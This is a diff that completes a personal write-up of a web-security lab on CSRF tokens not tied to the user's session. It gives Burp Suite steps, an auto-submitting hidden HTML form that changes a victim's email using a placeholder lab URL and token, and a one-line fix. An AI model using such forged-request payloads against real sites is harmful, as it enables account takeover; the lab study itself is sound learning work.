@@ -15,23 +15,22 @@ The app does not validate that the CSRF Token is from the same user session, the
 
 ## How I found it
 
-1. After logging in, I first changed my email address
+1. After logging in, I first changed wiener's email address
 2. I then looked though Burp Suite's **Proxy > HTTP history** for a request that changed the email address.
 3. After i found the request, i sent it to **Burp Suite's Repeater**
-
+4. In incognito, i logged into the other account (carlos) provided in the lab, inspected the form, found the CSRF token and copied it
+5. I then went back to Burp Repeater to that request and changed only the CSRF token from wiener's to carlos's and a new email address.
+6. I then refreshed each account's "/my-account" page and saw that wiener's email had changed but using carlos' CSRF
 
 ## Exploit
-
+``` html
+<form method="POST" action="<LAB_URL/my-account/change-email">
+  <input type="hidden" name="email" value="new-email@mail.net" />
+  <input type="hidden" name="CSRF" value="MY_CSRF_TOKEN"/>
+</form>
+<script> document.forms[0].submit() </script>
 ```
-<The payload or modified request. Keep it short.>
-```
-
-<One line on why this payload works.>
 
 ## Fix
+Validate session tokens and csrf to make sure they come from the same user making the request
 
-<How a developer should prevent this, e.g. parameterised queries, output encoding, server-side access checks.>
-
-## What I learned
-
-- <One takeaway you'd mention in an interview.>
